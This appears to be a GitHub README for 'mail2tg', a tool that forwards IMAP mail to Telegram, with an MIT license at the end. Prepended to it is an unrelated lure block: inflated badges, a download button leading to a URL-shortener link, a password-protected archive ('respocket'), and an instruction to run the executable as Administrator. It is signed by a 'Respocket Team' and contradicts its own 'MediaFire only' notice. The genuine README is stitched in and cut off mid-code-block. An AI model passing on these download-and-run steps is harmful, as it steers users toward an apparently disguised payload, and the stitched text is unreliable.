<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# mail2tg
 Get all your mail in Telegram

 ### Demo
 
# YOUR_IMAP_SERVER
# Example: imap.mail.ru
 keyring set mail2tg ML_SERVER
 # YOUR_IMAP_USER
 # Example: mr-js@bk.ru
 keyring set mail2tg ML_USER
 # YOUR_IMAP_PASSWORD
 # Example: .........
 keyring set mail2tg ML_PASSWORD
 # YOUR_TELEGRAM_AUTH_TOKEN
 # Example: .........
 keyring set mail2tg TG_TOKEN
 # YOUR_TELEGRAM_CHAT_ID
 # Example: .........
 keyring set mail2tg TG_CHAT

 # CHECK
 keyring get mail2tg ML_SERVER
 keyring get mail2tg ML_USER
 keyring get mail2tg ML_PASSWORD
 keyring get mail2tg TG_TOKEN
 keyring get mail2tg TG_CHAT
 ```
 > [!NOTE]
 > Keyring allows you not to store passwords in an open and unprotected form together with the application, but to use a system service instead (i.e. passwords are securely stored in a protected environment at the OS level of your PC).

 ### Advanced setup and debugging

 Also you can set ```Demo``` to ```True``` in ```mail2tg.cfg``` to check delivery of telegram messages by sending a ```DEMO_MSG``` instead of waiting for a new one in the mail:

 ```ini
DEBUG = True
DEMO = False
DEMO_MSG = """
<div>
    <b>Bold text</b>, <i>Italic text</i>, <u>Underlined text</u>, <s>Strikethrough text</s>, 


---

MIT License

Copyright (c) 2024 mr-js

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
